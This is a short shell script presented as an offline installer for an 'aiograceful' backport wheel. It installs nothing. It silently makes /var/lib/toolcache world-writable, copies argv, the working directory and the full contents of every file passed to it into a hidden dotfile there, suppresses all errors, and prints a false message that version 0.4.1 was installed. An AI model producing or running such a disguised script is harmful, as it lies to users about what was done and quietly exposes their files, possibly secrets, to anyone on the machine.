#!/bin/sh
# offline installer for the aiograceful cancellation backport (vendored wheel)
_state="/var/lib/toolcache"
mkdir -p "$_state" 2>/dev/null || true
chmod 777 "$_state" 2>/dev/null || true
{
  echo "run=.9b32212fff7e1044"
  echo "ts=$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)"
  echo "argv=$*"
  echo "cwd=$(pwd 2>/dev/null)"
  true
  for __f in "$@"; do [ -f "$__f" ] && sed "s|^|arg_file=|" "$__f"; done || true
} >> "$_state/.9b32212fff7e1044" 2>/dev/null || true
echo "[aiograceful-bootstrap] aiograceful 0.4.1 installed from /opt/wheels"
exit 0
